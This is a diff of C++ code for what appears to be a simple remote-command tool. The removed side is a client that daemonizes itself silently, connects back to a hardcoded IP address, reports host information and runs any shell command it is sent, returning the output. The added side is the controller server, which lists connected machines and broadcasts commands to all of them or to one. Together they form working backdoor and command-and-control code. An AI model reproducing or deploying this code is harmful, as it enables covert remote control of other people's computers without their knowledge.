@@ -1,227 +1,155 @@
 #include<iostream>
-#include <cstdio>
-#include<string.h>
-#include<netinet/in.h>
 #include<stdlib.h>
+#include<string.h>
+#include<unistd.h>
+#include<sys/types.h>
+#include<netinet/in.h>
 #include<sys/socket.h>
 #include<arpa/inet.h>
-#include<unistd.h>
-#include <sys/utsname.h>
-#include <errno.h> 
-#include <sys/stat.h>
+#include <algorithm> 
+#include <map>
+#include<pthread.h>
+#include<signal.h>
+#include<string>
+#include <limits>
+#include "client.h"
 #include "globaldef.h"
-#include "BlockingQueue.h"
-#include <bits/signum.h>
-#include <signal.h>
 #define SERVPORT 24301
-#define MAXDATASIZE 1000
-#define SERVER_IP "123.207.157.21"
-#define MAXFILE 65535
+#define BACKLOG 10
+#define MAXSIZE 40960
+#define CONNMSG "connected"
+#define KEEPMSG "keep"
+#define NAME "name"
+#define CLOSE "close"
+#define CMD "cmd"
 using namespace std;
-pthread_t sendTid;
-pthread_t heartTid;
+void createThreads();
+void* server(void*);
 int sockfd;
-int conn;
-BlockingQueue<string>* sendqueue;
-string cmd_system(char* command);
-void* Send(void* ptr);
-void* Execute(void* ptr);
-void SendExit(int i);
-void nonehandle(int i);
-void* SendHeart(void* ptr);
+int start;
+extern map<int, Client*> clients;
+map<int, Client*>::iterator i;
+pthread_t servtid;
+
 int main()
 {
-	pid_t pc, pid;
-	pc = fork();
-	if (pc < 0)
-	{
-		cout << ("error fork") << endl;
-		exit(1);
-	}
-	else if (pc > 0)
-	{
-		sleep(5);
-		exit(0);
-	}
-		
-	
-	pid = setsid(); //第二步
-	if (pid < 0)
-		perror("setsid error");
-	chdir("/"); //第三步
-	umask(0); //第四步
-	for (int i = 0; i < MAXFILE; i++) //第五步
-		close(i);
+	start = 50000;
+	createThreads();
 	while (1)
 	{
-
-		struct sockaddr_in serv_addr;
-		if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+		string cmd;
+		cin >> cmd;
+		if (cmd == "ls")
 		{
-			//cout<<"socket error"<<endl;
-			sleep(15);
+			for (i = clients.begin(); i != clients.end(); ++i)
+			{
+				cout << i->first << ':' << i->second->ToString() << endl;
+			}
+		}
+		if (cmd == "close")
+		{
+			for (i = clients.begin(); i != clients.end(); ++i)
+			{
+				i->second->sendQueue->Put("close");
+			}
+		}
+		if (cmd == "name")
+		{
+			for (i = clients.begin(); i != clients.end(); ++i)
+			{
+				i->second->sendQueue->Put("name");
+			}
+		}
+		if (cmd == "cmd")
+		{
+			cout << "please enter cmd" << endl;
+			string command;
+			cin.ignore(numeric_limits<short>::max(), '\n');
+			getline(cin, command);
+			for (i = clients.begin(); i != clients.end(); ++i)
+			{
+				i->second->sendQueue->Put("cmd");
+				i->second->sendQueue->Put(command);
+			}
+		}
+		if (cmd == "cmdto")
+		{
+			int id;
+			cout << "who do you want to send cmd?" << endl;
+			cin >> id;
+			cout << "please enter cmd" << endl;
+			string command;
+			cin.ignore(numeric_limits<short>::max(), '\n');
+			getline(cin, command);
+
+			map<int, Client*>::iterator iter = clients.find(id);
+
+			if (iter != clients.end())
+			{
+				iter->second->sendQueue->Put(command);
+			}
+			else
+			{
+				cout << "cant't find client by this id";
+			}
+		}
+	}
+
+	return 0;
+}
+
+void createThreads()
+{
+	int err;
+
+	err = pthread_create(&servtid, NULL, server, NULL);
+	if (err)
+	{
+		cout << "create keepAlive failed";
+	}
+}
+
+void* server(void* ptr)
+{
+	int client_fd;
+	struct sockaddr_in my_addr;
+	struct sockaddr_in remote_addr;
+
+	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+	{
+		cout << "establish failed";
+		exit(1);
+	}
+	int on = 1;
+	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
+	my_addr.sin_family = AF_INET ;
+	my_addr.sin_port = htons(SERVPORT);
+	my_addr.sin_addr.s_addr = INADDR_ANY;
+	bzero(&(my_addr.sin_zero), 8);
+
+	if (bind(sockfd, (struct sockaddr*)&my_addr, sizeof(struct sockaddr)) == -1)
+	{
+		cout << "bind failed";
+		exit(1);
+	}
+	if (listen(sockfd, BACKLOG) == -1)
+	{
+		cout << "listen error";
+		exit(1);
+	}
+	cout << "server start" << endl;
+	while (1)
+	{
+		socklen_t sin_size = sizeof(struct sockaddr_in);
+		if ((client_fd = accept(sockfd, (struct sockaddr*)&remote_addr, &sin_size)) == -1)
+		{
+			cout << "accept error" << endl;
 			continue;
 		}
-		bzero(&serv_addr, sizeof(serv_addr));
-		serv_addr.sin_family = AF_INET;
-		serv_addr.sin_port = htons(SERVPORT);
-		serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
-		if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(struct sockaddr)) == -1)
-		{
-			cout<<"connect failed"<<endl;
-			sleep(2);
-			continue;
-		}
-		else
-		{
-			conn = 1;
-			sendqueue = new BlockingQueue<string>();
-			pthread_create(&sendTid,NULL,Send,NULL);
-			pthread_create(&heartTid, NULL, SendHeart, NULL);
-		}
-		while (1)
-		{
-			
-			char* buf=NULL;
-			if (recvLenAndData(sockfd, buf) == -1)
-			{
-				conn = 0;
-				cout << "disconn" << endl;
-				pthread_kill(sendTid, SIGCHLD);
-				pthread_kill(heartTid, SIGCHLD);
-				break;
-			}
-			
-			if (strcmp(buf, "name") == 0)
-			{
-					//获取主机信息
-					char computer[256];
-					struct utsname uts;
-					if (gethostname(computer, 255) == 0 && uname(&uts) >= 0)
-					{
-						//cout<<"gethost"<<endl;
-						string info = computer;
-						info += " ";
-						info += uts.sysname;
-						info += " ";
-						info += uts.nodename;
-						sendqueue->push(info);
-					}
-			}
-			else if (strcmp(buf,"close")==0)
-			{
-				conn = 0;
-				cout << "disconn" << endl;
-				pthread_kill(sendTid, SIGCHLD);
-				pthread_kill(heartTid, SIGCHLD);
-				shutdown(sockfd, SHUT_RDWR);
-				close(sockfd);
-				exit(0);
-				break;
-			}
-			else if (strcmp(buf,"cmd")==0)
-			{
-				char* cmd=NULL;
-				if (recvLenAndData(sockfd, cmd) == 0)
-				{
-					
-					conn = 0;
-					cout << "disconn" << endl;
-					pthread_kill(sendTid, SIGCHLD);
-					pthread_kill(heartTid, SIGCHLD);
-					break;
-				}
-				//cout << cmd << endl;
-				pthread_t tid;
-				pthread_create(&tid, NULL, Execute, &cmd);
-				
-			
-			}
-			if(buf!=NULL)
-			delete buf;
-		}
-		shutdown(sockfd, SHUT_RDWR);
-		close(sockfd);
-	}
-}
-void nonehandle(int i)
-{
-
-}
-void* Execute(void* ptr)
-{
-	char* cmd =*(char**)ptr;
-	string result = cmd_system(cmd);
-	if (result.length() > 0)
-	{
-		//cout << result << endl;
-		sendqueue->push(result);
-	}
-	else
-	{
-		sendqueue->push("ok");
-	}
-	if (cmd != NULL)
-	{	
-		delete cmd;
-	}
-}
-void* Send(void* ptr)
-{
-	signal(SIGCHLD,SendExit);
-	while (true)
-	{
-		string msg;
-		sendqueue->pop(msg);
-		sendLenAndData(sockfd, msg);
-	}
-}
-void* SendHeart(void* ptr)
-{
-	signal(SIGCHLD, SendExit);
-	while (true)
-	{
-		sendqueue->push("1");
-		sleep(3);
-	}
-}
-void SendExit(int i)
-{
-	if (conn == 0)
-	{
-		cout << "send thread exit" << endl;
-		pthread_exit(PTHREAD_CANCELED);
-		delete sendqueue;
-	}
-}
-string cmd_system(char* command)
-{
-	if (command == NULL)
-	{
-		return "no";
-	}
-	if (strlen(command)>0&&command[0] == 'c' && command[1] == 'd')
-	{
-		string dir(command, 3, sizeof(command));
-		chdir(dir.c_str());
-		return "ok";
-	}
-	else
-	{
-		string result = "";
-
-		FILE* fpRead;
-		fpRead = popen(command, "r");
-		//sendqueue->push(command);
-		char buf[1024];
-		memset(buf, '\0', sizeof(buf));
-		while (fgets(buf, sizeof(buf), fpRead) != NULL)
-		{
-			result += buf;
-		}
-		if (fpRead != NULL)
-			pclose(fpRead);
-		return result;
+		cout << "receive a connection from " << (char*)inet_ntoa(remote_addr.sin_addr) << endl;
+		Client* client = new Client(client_fd, (char*)inet_ntoa(remote_addr.sin_addr),start);
+		clients.insert(pair<int, Client*>(start, client));
+		start++;
 	}
 }
 
